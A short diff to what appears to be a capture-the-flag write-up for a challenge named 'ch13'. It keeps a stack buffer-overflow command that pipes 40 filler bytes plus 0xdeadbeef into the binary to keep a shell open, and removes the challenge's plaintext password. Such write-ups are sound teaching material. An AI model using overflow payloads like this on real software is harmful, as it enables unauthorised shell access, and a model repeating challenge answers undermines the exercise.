@@ -12,6 +12,4 @@ All that's finally left is to keep the shell open before it is closed by the pro
 (python -c 'print("a"*40 + "\xef\xbe\xad\xde")'; cat -) | ./ch13
 ```
 
-the final answer we get is
-
-`1w4ntm0r3pr0np1s`
+and we get the password!
